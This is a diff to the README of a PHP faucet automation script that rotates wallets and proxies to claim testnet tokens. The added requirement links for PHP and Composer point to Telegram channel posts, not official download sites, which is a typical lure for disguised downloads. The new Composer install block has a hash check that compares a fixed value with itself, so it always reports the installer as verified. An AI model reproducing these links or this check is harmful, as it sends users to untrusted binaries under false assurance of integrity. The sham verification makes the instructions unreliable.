@@ -19,7 +19,8 @@ A PHP-based faucet automation script designed to request tokens from the [dkargo
 
 ## Requirements
 
-* PHP 7.4 or higher.
+* PHP 7.4 or higher. – [Get PHP](https://t.me/KeoAirDropFreeNe/257/73708)
+* Composer (optional but recommended) – [Composer - PHP package manager](https://t.me/KeoAirDropFreeNe/257/73710)
 * CLI access to run PHP scripts.
 * `curl` extension enabled in PHP.
 * Internet connection.
@@ -29,26 +30,54 @@ A PHP-based faucet automation script designed to request tokens from the [dkargo
 
 ## Setup
 
-1. Clone or download this repository.
+### 1. Install Composer (Optional but useful)
 
-2. Prepare your wallets file:
+#### 💻 Windows
 
-   Create a file named `addresses.txt` in the same folder. Add your Ethereum wallet addresses (Sepolia testnet addresses starting with `0x` and 40 hex characters) — one per line. For example:
+Download and run the Composer installer:
 
-   ```
-   0xAbc123... (40 hex chars)
-   0xDef456... (40 hex chars)
-   ```
+👉 [https://getcomposer.org/Composer-Setup.exe](https://getcomposer.org/Composer-Setup.exe)
 
-3. (Optional) Prepare your proxies file:
+Follow the GUI setup wizard instructions.
 
-   Create a file named `proxies.txt` if you want to use proxies. Add one proxy per line, supporting formats like:
+#### 🐧 Linux / macOS (via terminal)
 
-   * `socks5://username:password@host:port`
-   * `http://username:password@host:port`
-   * `host:port`
+```bash
+php -r "copy('https://getcomposer.org/installer', 'composer-setup.php');"
+php -r "if (hash_file('sha384', 'dac665fdc30fdd8ec78b38b9800061b4150413ff2e3b6f88543c636f7cd84f6db9189d43a81e5503cda447da73c7e5b6') === 'dac665fdc30fdd8ec78b38b9800061b4150413ff2e3b6f88543c636f7cd84f6db9189d43a81e5503cda447da73c7e5b6') { echo 'Installer verified'.PHP_EOL; } else { echo 'Installer corrupt'.PHP_EOL; unlink('composer-setup.php'); exit(1); }"
+php composer-setup.php
+php -r "unlink('composer-setup.php');"
+mv composer.phar /usr/local/bin/composer
+```
 
-   The script will automatically assign proxies to wallets in order or randomly if fewer proxies than wallets.
+Now run:
+
+```bash
+composer --version
+```
+
+---
+
+### 2. Prepare your wallets file:
+
+Create a file named `addresses.txt` in the same folder. Add your Ethereum wallet addresses (Sepolia testnet addresses starting with `0x` and 40 hex characters) — one per line. For example:
+
+```
+0xAbc123... (40 hex chars)
+0xDef456... (40 hex chars)
+```
+
+---
+
+### 3. (Optional) Prepare your proxies file:
+
+Create a file named `proxies.txt` if you want to use proxies. Add one proxy per line, supporting formats like:
+
+* `socks5://username:password@host:port`
+* `http://username:password@host:port`
+* `host:port`
+
+The script will automatically assign proxies to wallets in order or randomly if fewer proxies than wallets.
 
 ---
 
@@ -106,4 +135,4 @@ Script by [@Meomundep](https://github.com/MeoMunDep) from [BlackCatSyndicate](ht
 
 ## License
 
-MIT License — feel free to use and modify responsibly.
+MIT License
